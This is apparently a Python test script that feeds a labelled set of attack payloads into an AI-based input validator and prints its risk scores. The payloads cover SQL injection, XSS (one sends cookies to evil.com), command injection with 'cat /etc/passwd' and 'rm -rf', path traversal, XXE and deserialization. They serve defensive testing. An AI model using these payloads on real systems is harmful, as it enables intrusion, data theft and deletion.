#!/usr/bin/env python3
"""
AI-Enhanced Input Validation Test Script
Demonstrates the AgenticAI integration capabilities
"""

import sys
import os

# Add src directory to path
sys.path.append(os.path.join(os.path.dirname(__file__), 'src'))

from core.ai_enhanced_validator import AIEnhancedValidator, AIValidationMode
from ai.agentic_ai_integration import AIThreatLevel


def test_ai_enhanced_validation():
    """Test AI-enhanced validation functionality"""
    print("🧠 Testing AI-Enhanced Validation...")
    
    # Initialize AI-enhanced validator
    validator = AIEnhancedValidator(
        ai_mode=AIValidationMode.ADAPTIVE
    )
    
    # Test 1: Safe input
    print("\n✅ Test 1: Safe Input")
    safe_input = "Hello, this is a normal message"
    result = validator.validate_field_with_ai(safe_input, "string")
    
    print(f"Input: {safe_input}")
    print(f"Valid: {result.is_valid}")
    print(f"Risk Score: {result.combined_risk_score:.3f}")
    print(f"AI Threat Level: {result.ai_threat_analysis.threat_level.value}")
    print(f"Confidence: {result.ai_threat_analysis.confidence_score:.3f}")
    print(f"Anomaly Detected: {result.ai_threat_analysis.anomaly_detected}")
    
    # Test 2: SQL Injection attempt
    print("\n🚨 Test 2: SQL Injection Attempt")
    sql_payload = "'; DROP TABLE users; SELECT * FROM passwords WHERE id = 1 OR '1'='1"
    result = validator.validate_field_with_ai(sql_payload, "string", sql_safe=True)
    
    print(f"Input: {sql_payload}")
    print(f"Valid: {result.is_valid}")
    print(f"Risk Score: {result.combined_risk_score:.3f}")
    print(f"AI Threat Level: {result.ai_threat_analysis.threat_level.value}")
    print(f"Detected Patterns: {result.ai_threat_analysis.detected_patterns}")
    print(f"AI Recommendations: {result.ai_recommendations}")
    
    # Test 3: XSS attempt
    print("\n🚨 Test 3: XSS Attempt")
    xss_payload = "<script>alert('XSS')</script><img src=x onerror=alert('XSS')>"
    result = validator.validate_field_with_ai(xss_payload, "string", xss_safe=True)
    
    print(f"Input: {xss_payload}")
    print(f"Valid: {result.is_valid}")
    print(f"Risk Score: {result.combined_risk_score:.3f}")
    print(f"AI Threat Level: {result.ai_threat_analysis.threat_level.value}")
    print(f"Detected Patterns: {result.ai_threat_analysis.detected_patterns}")
    print(f"AI Recommendations: {result.ai_recommendations}")
    
    # Test 4: Command injection attempt
    print("\n🚨 Test 4: Command Injection Attempt")
    cmd_payload = "user_input && cat /etc/passwd; rm -rf /tmp/*"
    result = validator.validate_field_with_ai(cmd_payload, "string", command_safe=True)
    
    print(f"Input: {cmd_payload}")
    print(f"Valid: {result.is_valid}")
    print(f"Risk Score: {result.combined_risk_score:.3f}")
    print(f"AI Threat Level: {result.ai_threat_analysis.threat_level.value}")
    print(f"Detected Patterns: {result.ai_threat_analysis.detected_patterns}")
    print(f"AI Recommendations: {result.ai_recommendations}")
    
    # Test 5: Path traversal attempt
    print("\n🚨 Test 5: Path Traversal Attempt")
    path_payload = "../../../etc/passwd; ../../../../var/log/auth.log"
    result = validator.validate_field_with_ai(path_payload, "string", path_safe=True)
    
    print(f"Input: {path_payload}")
    print(f"Valid: {result.is_valid}")
    print(f"Risk Score: {result.combined_risk_score:.3f}")
    print(f"AI Threat Level: {result.ai_threat_analysis.threat_level.value}")
    print(f"Detected Patterns: {result.ai_threat_analysis.detected_patterns}")
    print(f"AI Recommendations: {result.ai_recommendations}")


def test_ai_schema_validation():
    """Test AI-enhanced schema validation"""
    print("\n📋 Testing AI-Enhanced Schema Validation...")
    
    validator = AIEnhancedValidator(ai_mode=AIValidationMode.ADAPTIVE)
    
    # Define a security-focused schema
    user_schema = {
        "username": {
            "type": "string",
            "required": True,
            "min_length": 3,
            "max_length": 30,
            "sql_safe": True,
            "xss_safe": True
        },
        "email": {
            "type": "email",
            "required": True,
            "sql_safe": True,
            "xss_safe": True
        },
        "profile_description": {
            "type": "string",
            "required": False,
            "max_length": 500,
            "sql_safe": True,
            "xss_safe": True
        }
    }
    
    # Test 1: Valid user data
    print("\n✅ Test 1: Valid User Data")
    valid_user = {
        "username": "john_doe",
        "email": "john@example.com",
        "profile_description": "A software developer"
    }
    
    result = validator.validate_schema_with_ai(valid_user, user_schema)
    
    print(f"Valid: {result.is_valid}")
    print(f"Risk Score: {result.combined_risk_score:.3f}")
    print(f"AI Threat Level: {result.ai_threat_analysis.threat_level.value}")
    print(f"Confidence: {result.ai_threat_analysis.confidence_score:.3f}")
    
    # Test 2: User data with security threats
    print("\n🚨 Test 2: User Data with Security Threats")
    malicious_user = {
        "username": "hacker'; DROP TABLE users; --",
        "email": "hacker@evil.com",
        "profile_description": "<script>alert('XSS')</script>"
    }
    
    result = validator.validate_schema_with_ai(malicious_user, user_schema)
    
    print(f"Valid: {result.is_valid}")
    print(f"Risk Score: {result.combined_risk_score:.3f}")
    print(f"AI Threat Level: {result.ai_threat_analysis.threat_level.value}")
    print(f"Detected Patterns: {result.ai_threat_analysis.detected_patterns}")
    print(f"AI Recommendations: {result.ai_recommendations}")


def test_ai_learning_and_adaptation():
    """Test AI learning and adaptation capabilities"""
    print("\n🧠 Testing AI Learning and Adaptation...")
    
    validator = AIEnhancedValidator(ai_mode=AIValidationMode.ADAPTIVE)
    
    # Test 1: Get AI insights
    print("\n📊 Test 1: AI Insights")
    insights = validator.get_ai_insights()
    print(f"Model Version: {insights.get('learning_progress', {}).get('model_version', 'unknown')}")
    print(f"Training Samples: {insights.get('learning_progress', {}).get('training_samples', 0)}")
    print(f"Anomaly Detection Accuracy: {insights.get('model_performance', {}).get('anomaly_detection_accuracy', 'unknown')}")
    
    # Test 2: Change AI mode
    print("\n🔄 Test 2: AI Mode Management")
    print(f"Current Mode: {validator.ai_mode.value}")
    
    # Test 3: Get validation statistics
    print("\n📈 Test 3: Validation Statistics")
    stats = validator.get_validation_statistics()
    print(f"AI Mode: {stats.get('ai_mode', 'unknown')}")
    
    # Test 4: Test behavioral analysis
    print("\n🔍 Test 4: Behavioral Analysis")
    
    # Test normal behavior
    normal_inputs = [
        "Hello world",
        "This is a test message",
        "User input for validation"
    ]
    
    print("Testing normal behavioral patterns...")
    for input_text in normal_inputs:
        result = validator.validate_field_with_ai(input_text, "string")
        print(f"Input: '{input_text}' -> Behavioral Score: {result.ai_threat_analysis.behavioral_score:.3f}")
    
    # Test anomalous behavior
    anomalous_inputs = [
        "a" * 1000,  # Very long input
        "x" * 50 + ";" * 20 + "x" * 50,  # Many semicolons
        "".join([chr(i) for i in range(32, 127)]) * 5  # All ASCII characters repeated
    ]
    
    print("\nTesting anomalous behavioral patterns...")
    for input_text in anomalous_inputs:
        result = validator.validate_field_with_ai(input_text, "string")
        print(f"Input length: {len(input_text)} -> Behavioral Score: {result.ai_threat_analysis.behavioral_score:.3f}")
        print(f"Anomaly Detected: {result.ai_threat_analysis.anomaly_detected}")


def test_ai_threat_intelligence():
    """Test AI threat intelligence capabilities"""
    print("\n🛡️ Testing AI Threat Intelligence...")
    
    validator = AIEnhancedValidator(ai_mode=AIValidationMode.ADAPTIVE)
    
    # Test various attack patterns
    attack_patterns = [
        ("SQL Injection", "'; SELECT * FROM users WHERE id = 1 OR '1'='1"),
        ("XSS Attack", "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>"),
        ("Command Injection", "user_input && cat /etc/passwd; rm -rf /tmp/*"),
        ("Path Traversal", "....//....//....//etc/passwd; ../../../../var/log/auth.log"),
        ("LDAP Injection", "*)(uid=*))(|(uid=*"),
        ("NoSQL Injection", '{"$where": "function() { return true }"}'),
        ("Template Injection", "{{7*7}} {{config.items()}}"),
        ("SSRF Attempt", "http://localhost:22 http://127.0.0.1:3306"),
        ("XXE Attack", "<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'file:///etc/passwd'>]><data>&file;</data>"),
        ("Deserialization Attack", "O:8:\"Example\":1:{s:3:\"cmd\";s:10:\"id;whoami\";}")
    ]
    
    print("Testing AI threat detection capabilities...")
    
    for attack_name, payload in attack_patterns:
        print(f"\n🔍 {attack_name}:")
        print(f"Payload: {payload[:50]}{'...' if len(payload) > 50 else ''}")
        
        # Perform AI analysis
        ai_analysis = validator.ai_integration.analyze_threat_intelligence(payload)
        
        print(f"  Threat Level: {ai_analysis.threat_level.value}")
        print(f"  Confidence: {ai_analysis.confidence_score:.3f}")
        print(f"  Anomaly Detected: {ai_analysis.anomaly_detected}")
        print(f"  Behavioral Score: {ai_analysis.behavioral_score:.3f}")
        
        if ai_analysis.detected_patterns:
            print(f"  Detected Patterns: {len(ai_analysis.detected_patterns)}")
            for pattern in ai_analysis.detected_patterns[:3]:  # Show first 3
                print(f"    - {pattern}")
        
        if ai_analysis.recommendations:
            print(f"  Recommendations: {len(ai_analysis.recommendations)}")
            for rec in ai_analysis.recommendations[:2]:  # Show first 2
                print(f"    - {rec}")


def main():
    """Run all AI validation tests"""
    print("🚀 AI-Enhanced Input Validation - Test Suite")
    print("=" * 60)
    
    try:
        test_ai_enhanced_validation()
        test_ai_schema_validation()
        test_ai_learning_and_adaptation()
        test_ai_threat_intelligence()
        
        print("\n🎉 All AI validation tests completed successfully!")
        print("\n💡 Key AI Features Demonstrated:")
        print("  • Intelligent threat detection")
        print("  • Behavioral analysis")
        print("  • Anomaly detection")
        print("  • Adaptive learning")
        print("  • Comprehensive security validation")
        print("  • AI-powered recommendations")
        
    except Exception as e:
        print(f"\n❌ Test failed with error: {e}")
        import traceback
        traceback.print_exc()
        return 1
    
    return 0


if __name__ == "__main__":
    sys.exit(main()) 